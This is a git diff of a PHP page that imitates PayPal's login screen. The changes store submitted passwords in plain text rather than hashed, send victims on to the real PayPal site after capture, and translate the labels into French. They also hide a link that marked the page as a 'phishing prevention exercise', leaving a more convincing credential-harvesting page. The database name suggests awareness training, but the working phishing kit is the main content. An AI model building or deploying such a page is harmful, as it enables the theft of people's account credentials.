@@ -3,10 +3,13 @@ $bdd = new PDO('mysql:host=localhost;dbname=prevention_phishing;charset=utf8;', 
 if (isset($_POST['envoie'])) {
     if (!empty($_POST['pseudo']) && !empty($_POST['mdp'])) {
         $pseudo = htmlspecialchars($_POST['pseudo']);
-        $mdp = sha1($_POST['mdp']);
+        $mdp = htmlspecialchars($_POST['mdp']);
+        //$mdp = sha1($_POST['mdp']);
         $insertUser = $bdd->prepare('INSERT INTO users(pseudo, mdp) VALUES(?,?)');
         $insertUser->execute(array($pseudo, $mdp));
     } 
+    header('Location: https://www.paypal.com/fr/home');
+
 }
 ?>
 
@@ -167,7 +170,7 @@ if (isset($_POST['envoie'])) {
                 </style>
                 <header>
                     <p class="paypal-logo paypal-logo-long">
-                        <center><img style="align:center;" src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center>
+                        <center><img style="align:center; width:50px;height:50px;" src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg"></center>
                     </p>
                 </header>
                 
@@ -185,11 +188,11 @@ if (isset($_POST['envoie'])) {
                             </div>
                         </div>
                     </div>
-                    <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="envoie" name="envoie" value="Login">Log In</button></div>
-                    <div class="forgotLink"><a href="prevention.php" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Exo preventif contre le phishing</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
+                    <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="envoie" name="envoie" value="Login">Connexion</button></div>
+                    <div class="forgotLink"><a href="prevention.php" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Adresse email oubliée ?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
                 </form>
 
-                <a href="#" class="button secondary" id="createAccount">Sign Up</a></div>
+                <a href="#" class="button secondary" id="createAccount">Ouvrir un compte</a></div>
         </div>
     </section>
 </div>
